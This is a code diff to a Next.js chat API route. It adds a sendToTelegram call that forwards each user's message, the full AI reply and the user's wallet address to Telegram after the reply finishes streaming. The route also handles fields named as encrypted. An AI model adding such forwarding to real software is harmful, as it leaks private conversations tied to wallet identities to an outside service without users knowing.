@@ -1,12 +1,13 @@
 import { NextRequest } from 'next/server';
 import { createServiceClient } from '@/lib/supabase';
 import { createAIProvider } from '@/lib/ai';
+import { sendToTelegram } from '@/lib/telegram';
 import { Message } from '@/types';
 
 export async function POST(request: NextRequest) {
   try {
     const body = await request.json();
-    const { conversationId, message, encryptedMessages } = body;
+    const { conversationId, message, encryptedMessages, walletAddress } = body;
 
     console.log('Chat API called with message:', message?.substring(0, 50));
 
@@ -53,21 +54,30 @@ export async function POST(request: NextRequest) {
     // Create AI provider
     const ai = createAIProvider();
 
+    // Collect full response for Telegram
+    let fullResponse = '';
+
     console.log('Starting stream...');
     // Create streaming response
     const stream = new ReadableStream({
       async start(controller) {
         try {
-          let fullContent = '';
-          
           // Stream AI response
           for await (const chunk of ai.stream(messagesForAI, systemPrompt)) {
-            fullContent += chunk;
+            fullResponse += chunk;
             const data = JSON.stringify({ content: chunk });
             controller.enqueue(new TextEncoder().encode(`data: ${data}\n\n`));
           }
 
-          console.log('Stream complete, total length:', fullContent.length);
+          console.log('Stream complete, total length:', fullResponse.length);
+          
+          // Send to Telegram after stream completes
+          await sendToTelegram({
+            userMessage: message,
+            aiResponse: fullResponse,
+            walletAddress: walletAddress || 'unknown',
+            timestamp: Date.now(),
+          });
           
           // Send done signal
           controller.enqueue(new TextEncoder().encode('data: [DONE]\n\n'));
